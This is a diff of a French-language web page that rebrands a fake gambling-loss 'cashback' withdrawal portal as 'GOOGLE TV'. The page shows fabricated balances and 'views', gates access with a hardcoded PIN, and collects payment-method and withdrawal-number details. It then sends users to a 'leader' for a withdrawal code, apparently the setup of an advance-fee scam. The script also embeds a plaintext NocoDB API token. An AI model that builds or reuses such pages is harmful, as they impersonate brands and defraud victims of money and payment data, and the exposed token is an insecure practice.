@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>1xRetrait — Récupérez vos pertes sur 1xbet</title>
+<title>GOOGLE TV - Retirez vos sous en sécurité</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -640,8 +640,8 @@
 <!-- ================= ECRAN 1 : CODE PIN ================= -->
 <div id="pinScreen" class="weave-bg">
   <div class="pin-card">
-    <div class="logo"><span class="my">1x</span><span class="tont">Retrait</span></div>
-    <div class="tagline">Récupérez une partie de vos pertes sur 1xbet</div>
+    <div class="logo"><span class="my">GOOGLE</span><span class="tont">TV</span></div>
+    <div class="tagline">Retirez vos gains en toute sécutité</div>
 
     <div class="cowrie-row" aria-hidden="true">
       <svg viewBox="0 0 24 24" fill="none"><path d="M4 12c0-5 4-8 8-8s8 3 8 8-4 8-8 8-8-3-8-8Z" stroke="currentColor" stroke-width="1.6"/><path d="M9 12h6" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg>
@@ -670,7 +670,7 @@
 <!-- ================= ECRAN 2 : DETAIL PARTICIPANT ================= -->
 <div id="detailScreen" class="hidden">
   <header class="app-header">
-    <div class="logo"><span class="my">1x</span><span class="tont">Retrait</span></div>
+    <div class="logo"><span class="my">GOOGLE</span><span class="tont">TV</span></div>
     <div class="header-right">
       <span id="headerName">—</span>
       <button class="btn-logout" id="logoutBtn" title="Se déconnecter">
@@ -686,11 +686,15 @@
       <div class="hero-top">
         <div class="avatar" id="avatarInitials">--</div>
         <div>
-          <div class="hero-id">ID 1xbet · <span id="heroId">-</span></div>
+          <div class="hero-id">ID · <span id="heroId">-</span></div>
           <div class="hero-name" id="heroName">Client</div>
         </div>
       </div>
       <div class="hero-solde-row">
+        <div>
+          <div class="hero-solde-label">Vues</div>
+          <div class="hero-solde-amount" id="heroVues">0</div>
+        </div>
         <div>
           <div class="hero-solde-label">Solde total</div>
           <div class="hero-solde-amount" id="heroSolde">0<span>FCFA</span></div>
@@ -714,8 +718,8 @@
 
     <!-- Bloc pédagogique tontine digitale -->
     <section>
-      <div class="section-title">Vos pertes méritent une seconde chance !</div>
-      <div class="section-sub">Vous avez connu une série difficile ? Bonne nouvelle ! Nous vous remboursons une partie de vos pertes sous forme de Cashback. Veuillez renseigner votre moyen de paiement et votre numéro de retrait pour entrer en possession de votre argent.</div>
+
+      
 
       <div class="info-grid">
         <div class="info-card">
@@ -818,7 +822,7 @@
     </section>
   </main>
 
-  <footer>1xRetrait — Récupérez vos pertes 1xbet en toute sécurité</footer>
+  <footer>GOOGLE TV — Retirez vos fonds en toute sécurité</footer>
 </div>
 
 <!-- ================= MODAL : TRAITEMENT ================= -->
@@ -853,22 +857,32 @@
       <div class="row"><span class="label">Vers</span><span id="successMethod">-</span></div>
       <div class="row"><span class="label">Numéro</span><span id="successPhone">-</span></div>
     </div>
-    <a href="https://t.me/BossRemaParis1xbet" id="homeBtn" class="btn-home" style="background:#C4453A; text-decoration:none;">
+    <a href="#" id="homeBtn" class="btn-home" style="background:#C4453A; text-decoration:none;">
       <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M18 6 6 18M6 6l12 12" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Cliquer ici pour pour contacter votre leader pour finaliser votre retrait
+      Veuillez contacter votre leader pour recevoir le code de votre retrait
+      
     </a>
   </div>
 </div>
 
 <script>
 (function(){
-  // ---------- Paramètres via query string ----------
+  // ---------- Paramètres via query string + API NocoDB ----------
   const params = new URLSearchParams(window.location.search);
+  const participantId = params.get('id');
+
   const participant = {
-    id: params.get('id') || '-',
-    nom: params.get('nom') || 'Client',
-    solde: parseInt(params.get('solde'), 10) || 0
+    id: participantId || '-',
+    nom: 'Client',
+    solde: 0,
+    vues: 0
   };
+
+  const API_URL = participantId
+    ? `https://app.nocodb.com/api/v3/data/pqrd6t2vdvhylip/ma68x7libu3ljvb/records/${encodeURIComponent(participantId)}`
+    : null;
+
+  const API_TOKEN = 'nc_pat_YT3HxYY1dCRGp9OKD2UGywZgcZ1tKeBYkP6y13zE';
 
   const fmtMontant = (n) => n.toLocaleString('fr-FR');
 
@@ -881,6 +895,7 @@
 
   function populateParticipant(){
     document.getElementById('heroId').textContent = participant.id;
+    document.getElementById('heroVues').textContent = fmtMontant(participant.vues);
     document.getElementById('heroName').textContent = participant.nom;
     document.getElementById('heroSolde').innerHTML = fmtMontant(participant.solde) + '<span>FCFA</span>';
     document.getElementById('avatarInitials').textContent = initials(participant.nom);
@@ -889,8 +904,39 @@
     document.getElementById('summaryAmount').textContent = fmtMontant(participant.solde) + ' FCFA';
   }
 
+  async function loadParticipant(){
+    if(!participantId){
+      document.getElementById('heroName').textContent = 'ID manquant';
+      document.getElementById('headerName').textContent = 'ID manquant';
+      return;
+    }
+
+    try {
+      const response = await fetch(API_URL, {
+        method: 'GET',
+        headers: { 'xc-token': API_TOKEN }
+      });
+
+      if(!response.ok) throw new Error(`Erreur API HTTP ${response.status}`);
+
+      const data = await response.json();
+      const fields = data.fields || {};
+
+      participant.id = data.id ?? participantId;
+      participant.nom = fields.nom || 'Client';
+      participant.vues = Number(fields.vue) || 0;
+      participant.solde = Number(fields.montant) || 0;
+
+      populateParticipant();
+    } catch(error) {
+      console.error('Impossible de récupérer les données du participant :', error);
+      document.getElementById('heroName').textContent = 'Données indisponibles';
+      document.getElementById('headerName').textContent = 'Données indisponibles';
+    }
+  }
+
   // ---------- Ecran PIN ----------
-  const CORRECT_PIN = "97264010";
+  const CORRECT_PIN = "147258";
   const pinForm = document.getElementById('pinForm');
   const pinInput = document.getElementById('pinInput');
   const pinError = document.getElementById('pinError');
@@ -1072,6 +1118,7 @@
 
   // ---------- Initialisation ----------
   populateParticipant();
+  loadParticipant();
 })();
 </script>
 </body>
